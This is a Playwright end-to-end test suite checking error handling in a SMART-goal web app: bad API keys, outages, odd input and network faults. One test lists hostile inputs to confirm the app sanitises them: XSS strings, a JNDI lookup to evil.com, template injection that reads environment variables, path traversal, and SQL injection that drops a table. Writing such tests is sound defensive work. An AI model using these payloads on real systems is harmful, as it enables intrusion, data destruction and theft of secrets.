import { test, expect } from '@playwright/test';
import { ApiConfigPage } from '../page-objects/ApiConfigPage';
import { GoalInputPage } from '../page-objects/GoalInputPage';
import { SmartGoalPage } from '../page-objects/SmartGoalPage';
import { TestUtils } from '../fixtures/test-utils';
import { TEST_GOALS } from '../fixtures/test-data';

test.describe('Comprehensive Error Scenario Testing - Transform to SMART Goal Button', () => {
  let apiConfigPage: ApiConfigPage;
  let goalInputPage: GoalInputPage;
  let smartGoalPage: SmartGoalPage;
  let testUtils: TestUtils;

  test.beforeEach(async ({ page }) => {
    apiConfigPage = new ApiConfigPage(page);
    goalInputPage = new GoalInputPage(page);
    smartGoalPage = new SmartGoalPage(page);
    testUtils = new TestUtils(page);

    await page.goto('/');
  });

  test.describe('Invalid API Key Scenarios', () => {
    test('should handle completely invalid API key', async () => {
      // Configure with invalid API key
      await apiConfigPage.configureApi('invalid-key-123', 'http://localhost:3001');
      
      // Mock API to return 401 Unauthorized for invalid key
      await testUtils.page.route('**/api/smart-goal', async route => {
        await route.fulfill({
          status: 401,
          contentType: 'application/json',
          body: JSON.stringify({ 
            success: false, 
            error: 'Invalid API key', 
            code: 'UNAUTHORIZED' 
          })
        });
      });

      await goalInputPage.enterGoal('Test goal with invalid API key');
      await goalInputPage.clickSubmit();

      // Verify error handling
      const errorMessage = testUtils.page.locator('[data-testid="error-message"]');
      await expect(errorMessage).toBeVisible();
      await expect(errorMessage).toContainText('Invalid API key');
      
      // Transform button should show error state
      const transformButton = testUtils.page.locator('button:has-text("Transform to SMART Goal")');
      await expect(transformButton).toHaveClass(/error/);
      
      await testUtils.takeScreenshotWithTimestamp('invalid-api-key-error');
    });

    test('should handle expired API key', async () => {
      await apiConfigPage.configureApi('expired-key-456', 'http://localhost:3001');
      
      // Mock API to return 403 Forbidden for expired key
      await testUtils.page.route('**/api/smart-goal', async route => {
        await route.fulfill({
          status: 403,
          contentType: 'application/json',
          body: JSON.stringify({ 
            success: false, 
            error: 'API key has expired', 
            code: 'FORBIDDEN',
            details: 'Please renew your API key to continue using the service'
          })
        });
      });

      await goalInputPage.enterGoal('Test goal with expired API key');
      await goalInputPage.clickSubmit();

      const errorMessage = testUtils.page.locator('[data-testid="error-message"]');
      await expect(errorMessage).toBeVisible();
      await expect(errorMessage).toContainText('API key has expired');
      
      // Should provide renewal instructions
      const renewalInfo = testUtils.page.locator('[data-testid="renewal-info"]');
      await expect(renewalInfo).toBeVisible();
      
      await testUtils.takeScreenshotWithTimestamp('expired-api-key-error');
    });

    test('should handle rate limited API key', async () => {
      await apiConfigPage.configureApi('rate-limited-key', 'http://localhost:3001');
      
      // Mock API to return 429 Too Many Requests
      await testUtils.page.route('**/api/smart-goal', async route => {
        await route.fulfill({
          status: 429,
          contentType: 'application/json',
          headers: {
            'Retry-After': '60'
          },
          body: JSON.stringify({ 
            success: false, 
            error: 'Rate limit exceeded', 
            code: 'RATE_LIMITED',
            retryAfter: 60
          })
        });
      });

      await goalInputPage.enterGoal('Test goal with rate limited API');
      await goalInputPage.clickSubmit();

      const errorMessage = testUtils.page.locator('[data-testid="error-message"]');
      await expect(errorMessage).toBeVisible();
      await expect(errorMessage).toContainText('Rate limit exceeded');
      
      // Should show retry timer
      const retryTimer = testUtils.page.locator('[data-testid="retry-timer"]');
      await expect(retryTimer).toBeVisible();
      
      await testUtils.takeScreenshotWithTimestamp('rate-limited-error');
    });
  });

  test.describe('Backend Service Down Scenarios', () => {
    test('should handle complete backend service unavailability', async () => {
      await apiConfigPage.configureApi('valid-key', 'http://localhost:3001');
      
      // Mock complete service unavailability
      await testUtils.page.route('**/api/smart-goal', async route => {
        await route.abort('connectionrefused');
      });

      await goalInputPage.enterGoal('Test goal with service down');
      await goalInputPage.clickSubmit();

      // Should show service unavailable message
      const serviceDownMessage = testUtils.page.locator('[data-testid="service-unavailable"]');
      await expect(serviceDownMessage).toBeVisible();
      await expect(serviceDownMessage).toContainText('Service temporarily unavailable');
      
      // Should show retry option
      const retryButton = testUtils.page.locator('button:has-text("Retry")');
      await expect(retryButton).toBeVisible();
      
      await testUtils.takeScreenshotWithTimestamp('service-unavailable');
    });

    test('should handle backend returning 500 Internal Server Error', async () => {
      await apiConfigPage.configureApi('valid-key', 'http://localhost:3001');
      
      await testUtils.page.route('**/api/smart-goal', async route => {
        await route.fulfill({
          status: 500,
          contentType: 'application/json',
          body: JSON.stringify({ 
            success: false, 
            error: 'Internal server error', 
            code: 'INTERNAL_ERROR',
            correlation_id: 'error-123'
          })
        });
      });

      await goalInputPage.enterGoal('Test goal with server error');
      await goalInputPage.clickSubmit();

      const errorMessage = testUtils.page.locator('[data-testid="error-message"]');
      await expect(errorMessage).toBeVisible();
      await expect(errorMessage).toContainText('Internal server error');
      
      // Should show correlation ID for debugging
      const correlationId = testUtils.page.locator('[data-testid="correlation-id"]');
      await expect(correlationId).toContainText('error-123');
      
      await testUtils.takeScreenshotWithTimestamp('internal-server-error');
    });

    test('should handle OpenAI service timeout', async () => {
      await apiConfigPage.configureApi('valid-key', 'http://localhost:3001');
      
      await testUtils.page.route('**/api/smart-goal', async route => {
        await route.fulfill({
          status: 504,
          contentType: 'application/json',
          body: JSON.stringify({ 
            success: false, 
            error: 'OpenAI service timeout', 
            code: 'GATEWAY_TIMEOUT',
            details: 'The AI service took too long to respond'
          })
        });
      });

      await goalInputPage.enterGoal('Test goal with OpenAI timeout');
      await goalInputPage.clickSubmit();

      const timeoutMessage = testUtils.page.locator('[data-testid="timeout-message"]');
      await expect(timeoutMessage).toBeVisible();
      await expect(timeoutMessage).toContainText('AI service took too long to respond');
      
      await testUtils.takeScreenshotWithTimestamp('openai-timeout');
    });
  });

  test.describe('Malformed Goal Input Scenarios', () => {
    test('should handle extremely long goal input', async () => {
      await testUtils.setupApiConfig();
      
      const extremelyLongGoal = 'A'.repeat(50000); // 50k characters
      
      await goalInputPage.enterGoal(extremelyLongGoal);
      await goalInputPage.clickSubmit();

      // Should show input validation error
      const validationError = testUtils.page.locator('[data-testid="validation-error"]');
      await expect(validationError).toBeVisible();
      await expect(validationError).toContainText('Goal input is too long');
      
      await testUtils.takeScreenshotWithTimestamp('extremely-long-input');
    });

    test('should handle empty or whitespace-only goal input', async () => {
      await testUtils.setupApiConfig();
      
      const whitespaceInputs = ['', '   ', '\n\n\n', '\t\t\t'];
      
      for (const input of whitespaceInputs) {
        await goalInputPage.enterGoal(input);
        await goalInputPage.clickSubmit();

        const validationError = testUtils.page.locator('[data-testid="validation-error"]');
        await expect(validationError).toBeVisible();
        
        await goalInputPage.clickClear();
      }
      
      await testUtils.takeScreenshotWithTimestamp('whitespace-input-validation');
    });

    test('should handle special characters and encoding issues', async () => {
      await testUtils.setupApiConfig();
      
      const specialCharacterInputs = [
        '🚀🎯📈 Increase revenue by 25% 💰💪',
        'Увеличить доходы на 25% в течение 6 месяцев',
        '在6个月内将收入增加25%',
        'Aumentar los ingresos en un 25% en 6 meses',
        'Goal\\nwith\\nnewlines\\nand\\ttabs',
        'Goal with "quotes" and \'apostrophes\' and <brackets>'
      ];
      
      for (const input of specialCharacterInputs) {
        await goalInputPage.enterGoal(input);
        await goalInputPage.clickSubmit();
        
        // Should handle gracefully without errors
        await testUtils.assertNoErrors();
        
        // Wait for processing or error state
        await testUtils.page.waitForTimeout(2000);
        
        await goalInputPage.clickClear();
      }
      
      await testUtils.takeScreenshotWithTimestamp('special-characters-handling');
    });

    test('should handle malicious script injection attempts', async () => {
      await testUtils.setupApiConfig();
      
      const maliciousInputs = [
        '<script>alert("XSS");</script>',
        'javascript:alert("XSS")',
        '${jndi:ldap://evil.com/exploit}',
        '{{constructor.constructor("return process")().env}}',
        '../../etc/passwd',
        'SELECT * FROM users WHERE 1=1; DROP TABLE users;--',
        'onload="alert(document.cookie)"',
        '<img src=x onerror=alert(1)>'
      ];
      
      for (const maliciousInput of maliciousInputs) {
        await goalInputPage.enterGoal(maliciousInput);
        await goalInputPage.clickSubmit();
        
        // Should sanitize input and handle safely
        await testUtils.assertNoScriptExecution();
        await testUtils.assertNoErrors();
        
        await goalInputPage.clickClear();
      }
      
      await testUtils.takeScreenshotWithTimestamp('malicious-input-protection');
    });
  });

  test.describe('Network Condition Testing', () => {
    test('should handle slow network conditions', async () => {
      await testUtils.setupApiConfig();
      
      // Simulate slow network (2G connection)
      await testUtils.simulateSlowNetwork({
        downloadThroughput: 250 * 1024, // 250 kbps
        uploadThroughput: 100 * 1024,   // 100 kbps
        latency: 300 // 300ms latency
      });

      const testGoal = TEST_GOALS.find(g => g.complexity === 'medium')!;
      await goalInputPage.enterGoal(testGoal.input);
      await goalInputPage.clickSubmit();

      // Should show loading state immediately
      const loadingSpinner = testUtils.page.locator('[data-testid="loading-spinner"]');
      await expect(loadingSpinner).toBeVisible();
      
      // Should eventually complete or timeout gracefully
      await testUtils.page.waitForTimeout(10000);
      
      // Reset network conditions
      await testUtils.resetNetworkConditions();
      
      await testUtils.takeScreenshotWithTimestamp('slow-network-handling');
    });

    test('should handle intermittent network failures', async () => {
      await testUtils.setupApiConfig();
      
      let requestCount = 0;
      await testUtils.page.route('**/api/smart-goal', async route => {
        requestCount++;
        
        if (requestCount <= 2) {
          // Fail first two requests
          await route.abort('connectionrefused');
        } else {
          // Succeed on third request
          await route.fulfill({
            status: 200,
            contentType: 'application/json',
            body: JSON.stringify({
              success: true,
              data: {
                id: 'goal-retry-test',
                title: 'Test goal after retry',
                confidence: 0.8,
                criteria: {
                  specific: { value: 'Test specific', confidence: 0.8 },
                  measurable: { value: 'Test measurable', confidence: 0.8 },
                  achievable: { value: 'Test achievable', confidence: 0.8 },
                  relevant: { value: 'Test relevant', confidence: 0.8 },
                  timeBound: { value: 'Test time-bound', confidence: 0.8 }
                }
              }
            })
          });
        }
      });

      await goalInputPage.enterGoal('Test goal with network retry');
      await goalInputPage.clickSubmit();

      // Should show retry attempts
      const retryMessage = testUtils.page.locator('[data-testid="retry-message"]');
      await expect(retryMessage).toBeVisible();
      
      // Should eventually succeed
      await smartGoalPage.assertSmartGoalDisplayed();
      
      await testUtils.takeScreenshotWithTimestamp('network-retry-success');
    });

    test('should handle complete network disconnection', async () => {
      await testUtils.setupApiConfig();
      
      // Simulate complete network disconnection
      await testUtils.page.setOfflineMode(true);

      await goalInputPage.enterGoal('Test goal while offline');
      await goalInputPage.clickSubmit();

      // Should show offline message
      const offlineMessage = testUtils.page.locator('[data-testid="offline-message"]');
      await expect(offlineMessage).toBeVisible();
      await expect(offlineMessage).toContainText('No internet connection');
      
      // Reconnect and retry
      await testUtils.page.setOfflineMode(false);
      const retryButton = testUtils.page.locator('button:has-text("Retry")');
      await retryButton.click();
      
      await testUtils.takeScreenshotWithTimestamp('offline-handling');
    });
  });

  test.describe('Transform Button Specific Error States', () => {
    test('should show proper loading state on Transform button', async () => {
      await testUtils.setupApiConfig();
      
      // Add delay to API response to test loading state
      await testUtils.page.route('**/api/smart-goal', async route => {
        await testUtils.page.waitForTimeout(3000); // 3 second delay
        await route.fulfill({
          status: 200,
          contentType: 'application/json',
          body: JSON.stringify({
            success: true,
            data: { id: 'test', title: 'Test Goal', confidence: 0.8 }
          })
        });
      });

      await goalInputPage.enterGoal('Test goal for button loading state');
      
      const transformButton = testUtils.page.locator('button:has-text("Transform to SMART Goal")');
      await transformButton.click();

      // Button should show loading state
      await expect(transformButton).toHaveClass(/loading/);
      await expect(transformButton).toBeDisabled();
      
      // Should show loading text or spinner
      const buttonText = transformButton.locator('span');
      await expect(buttonText).toContainText(/Processing|Loading/);
      
      await testUtils.takeScreenshotWithTimestamp('transform-button-loading');
    });

    test('should handle multiple rapid button clicks', async () => {
      await testUtils.setupApiConfig();
      
      let requestCount = 0;
      await testUtils.page.route('**/api/smart-goal', async route => {
        requestCount++;
        await testUtils.page.waitForTimeout(1000);
        await route.fulfill({
          status: 200,
          contentType: 'application/json',
          body: JSON.stringify({
            success: true,
            data: { id: `test-${requestCount}`, title: 'Test Goal', confidence: 0.8 }
          })
        });
      });

      await goalInputPage.enterGoal('Test goal for rapid clicks');
      
      const transformButton = testUtils.page.locator('button:has-text("Transform to SMART Goal")');
      
      // Click button multiple times rapidly
      await transformButton.click();
      await transformButton.click();
      await transformButton.click();

      // Should only make one API request
      await testUtils.page.waitForTimeout(2000);
      expect(requestCount).toBe(1);
      
      await testUtils.takeScreenshotWithTimestamp('rapid-clicks-prevention');
    });

    test('should reset button state after error', async () => {
      await testUtils.setupApiConfig();
      
      // First request fails
      let shouldFail = true;
      await testUtils.page.route('**/api/smart-goal', async route => {
        if (shouldFail) {
          await route.fulfill({
            status: 500,
            contentType: 'application/json',
            body: JSON.stringify({ success: false, error: 'Test error' })
          });
          shouldFail = false;
        } else {
          await route.fulfill({
            status: 200,
            contentType: 'application/json',
            body: JSON.stringify({
              success: true,
              data: { id: 'test-success', title: 'Test Goal', confidence: 0.8 }
            })
          });
        }
      });

      await goalInputPage.enterGoal('Test goal for button reset');
      
      const transformButton = testUtils.page.locator('button:has-text("Transform to SMART Goal")');
      await transformButton.click();

      // Wait for error
      const errorMessage = testUtils.page.locator('[data-testid="error-message"]');
      await expect(errorMessage).toBeVisible();

      // Button should be reset and clickable again
      await expect(transformButton).toBeEnabled();
      await expect(transformButton).not.toHaveClass(/loading|error/);
      
      // Try again - should succeed
      await transformButton.click();
      await smartGoalPage.assertSmartGoalDisplayed();
      
      await testUtils.takeScreenshotWithTimestamp('button-reset-after-error');
    });
  });

  test.describe('Cross-Browser Error Consistency', () => {
    ['chromium', 'firefox', 'webkit'].forEach(browserName => {
      test(`should handle errors consistently in ${browserName}`, async ({ browser }) => {
        const context = await browser.newContext();
        const page = await context.newPage();
        
        const localApiConfigPage = new ApiConfigPage(page);
        const localGoalInputPage = new GoalInputPage(page);
        const localTestUtils = new TestUtils(page);

        await page.goto('/');
        await localApiConfigPage.configureApi('invalid-key', 'http://localhost:3001');
        
        await page.route('**/api/smart-goal', async route => {
          await route.fulfill({
            status: 401,
            contentType: 'application/json',
            body: JSON.stringify({ success: false, error: 'Unauthorized' })
          });
        });

        await localGoalInputPage.enterGoal('Cross-browser error test');
        await localGoalInputPage.clickSubmit();

        const errorMessage = page.locator('[data-testid="error-message"]');
        await expect(errorMessage).toBeVisible();
        
        await localTestUtils.takeScreenshotWithTimestamp(`cross-browser-error-${browserName}`);
        
        await context.close();
      });
    });
  });
});